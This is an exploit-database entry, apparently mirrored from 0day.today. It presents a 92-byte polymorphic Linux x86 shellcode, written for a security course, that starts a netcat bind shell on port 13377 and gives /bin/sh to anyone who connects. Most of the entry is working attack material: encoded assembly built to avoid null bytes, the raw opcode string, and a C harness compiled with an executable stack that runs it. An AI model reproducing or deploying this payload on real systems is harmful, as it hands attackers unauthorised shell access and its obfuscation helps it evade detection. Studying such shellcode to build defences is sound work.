@@ -1,0 +1,134 @@
+id: 38467
+date: 04/03/2023
+title: Linux/x86 - Polymorphic linux x86 Shellcode (92 Bytes)
+author: Eduardo Silva
+cves: 
+
+# Exploit Title: Polymorphic linux x86 nc -lvve/bin/sh -p13377 shellcode (92 Bytes)
+# Exploit Author: Eduardo Silva
+# Tested on: Linux x86_64 SMP Debian 4.19.260-1
+# SLAE/Student ID: PA-31319
+# Webpage: https://0xnibbles.github.io/
+
+# Description: This shellcode is a polymorphic version of http://www.shell-storm.org/shellcode/files/shellcode-804.html. 
+#              Shellcode is converted to raw opcodes and splitted in various "pieces" and those are decoded in runtime. Each "piece" of code is a preparation to nc arguments.
+#              To determine the end of each "piece" of opcodes that represent shellcode a nop (0x90) is used instead of a null bytes. the nop is decoded in runtime.
+#              The instruction - lea $Register, [esi+4]  -determines which argument is being set up
+#              It leverages the x87 FPU instructions fnop and fnstenv to store EIP onto the stack and jump for the relative address in runtime. This used to avoid using call to perform relative jump as this introduces null bytes.  
+#              For example, the relatiev call instruction - call $ + 0x12   ;\xe8\x0d\x00\x00\x00 - results in null bytes being added. USing fnstenv avoids this situation
+#
+# Example:
+#      $ ./shellcode
+#      Shellcode Length: 92
+#      listening on [any] 13377
+#
+#       [...] 
+#       $ nc 127.0.0.1 13377
+#       id
+#       uid=1000 ...
+#
+####################################
+
+
+;Polymorphic linux x86 nc -lvve/bin/sh -p13377 shellcode
+;This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker
+
+global _start
+
+section .text
+_start:
+
+xor eax,eax
+
+mov al, 0x8
+fnop
+jmp short argParser     ;fnstenv will make x87 FPU store this address
+                        ; the argParser stub adds 4 bytes to the stored and redirect execution to the next isntruction
+
+sub    eax,0x33317076   
+xor    esi,DWORD [edi]
+aaa
+nop
+
+lea edx, [esi+4]
+
+mov al, 0xc
+fnop
+jmp short argParser
+
+sub   eax,0x6576766c    ; \xe8\x0e\x00\x00\x00
+das
+bound  ebp, [ecx+0x6e]
+das
+jae $+0x6a
+nop
+
+
+lea ecx, [esi+4]
+
+;call $ + 0x12   ;\xe8\x0d\x00\x00\x00 --> example of how a call introduces null bytes
+
+mov al, 0xc
+fnop
+jmp short argParser
+
+das
+bound  ebp, [ecx+0x6e]
+das
+das
+das
+das
+das
+das
+outsb
+arpl word [eax],bx
+
+lea ebx, [esi+4]
+
+push eax
+push edx
+push ecx
+push ebx
+
+
+
+cdq
+mov  ecx,esp
+mov al, 0xb
+int 0x80
+
+argParser:  ; similar to jmp-call-pop but calls to a nop byte
+            ; assuming al has the right distance
+    fnstenv [esp-0xc]
+    ;pop esi
+    mov byte [esi + 0x4 + eax], ah ; null-byte decoder
+    lea edi, [esi + 0x4+eax+0x1]
+    xor eax,eax
+    jmp edi
+
+##############################################
+
+// Filename: shellcode.c
+// Compile:  gcc -m32 -z execstack -fno-stack-protector shellcode.c -o shellcode
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+
+"\x31\xc0\xb0\x08\xd9\xd0\xeb\x43\x2d\x76\x70\x31\x33\x33\x37\x37\x90\x8d\x56\x04\xb0\x0c\xd9\xd0"
+"\xeb\x31\x2d\x6c\x76\x76\x65\x2f\x62\x69\x6e\x2f\x73\x68\x90\x8d\x4e\x04\xb0\x0c\xd9\xd0\xeb\x1b"
+"\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x2f\x2f\x6e\x63\x18\x8d\x5e\x04\x50\x52\x51\x53\x99\x89\xe1\xb0"
+"\x0b\xcd\x80\xd9\x74\x24\xf4\x88\x64\x06\x04\x8d\x7c\x30\x05\x31\xc0\xff\xe7";
+
+
+main() {
+
+	printf("Shellcode Length: %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+
+#  0day.today [2023-04-19]  #
